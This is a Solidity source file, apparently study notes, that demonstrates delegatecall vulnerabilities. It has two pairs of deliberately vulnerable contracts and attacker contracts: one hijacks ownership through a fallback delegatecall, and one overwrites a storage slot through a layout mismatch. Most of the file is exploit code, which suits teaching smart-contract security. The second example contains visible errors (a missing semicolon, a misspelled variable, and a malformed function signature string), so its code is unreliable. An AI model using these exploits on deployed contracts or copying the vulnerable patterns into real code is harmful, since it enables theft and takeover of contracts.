/*

Delegatecall
Vulnerability
delegatecall is tricky to use and wrong usage or incorrect understanding can lead to devastating results.

You must keep 2 things in mind when using delegatecall

delegatecall preserves context (storage, caller, etc...)
storage layout must be the same for the contract calling delegatecall and the contract getting called

*/

//SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.24;

contract Lib {
	
	address public owner;

	function pwn() public {
		owner = msg.sender;
	}
}


contract HackMe {
	address public owner;
	Lib public lib;

	constructor(Lib _lib){
		owner = msg.sender;
		lib = Lib(_lib);
	}

	fallback() external payable {
		address(lib).delegatecall(msg.data);
	}
}

contract Attack {
	address public hackMe;

	constructor(address _hackMe){
		hackMe = _hackMe;
	}

	function attack() public {
		hackMe.call(abi.encodeWithSignature("pwn()"));
	}
}



//SPDX
pragma solidity ^0.8.24

contract Lib {
	uint256 public someNumber;

	function doSomething(uint256 _num) public {
		someNUmber = _num;
	}
}

contract HackMe{
	address public lib;
	address public owner;
	uint256 public someNumber;

	constructor (address _lib){
		lib = _lib;
		owner = msg.sender;
	}

	function doSomething(uint256 _num) public {
		lib.delegatecall(abi.encodeWithSignature("doSomething(uint256",_num));
	}
}

contract Attack {
	address public lib;
	address public owner;
	uint256 public someNumber;

	HackMe public hackMe;

	constructor(HackMe _hackMe){
		hackMe = HackMe(_hackMe);
	}

	function attack() public {
		hackMe.doSomething(uint256(uint160(address(this))));

		hackMe.doSomething(1);
	}

	function doSomething(uint256 _num) public {
		owner = msg.sender;
	}
}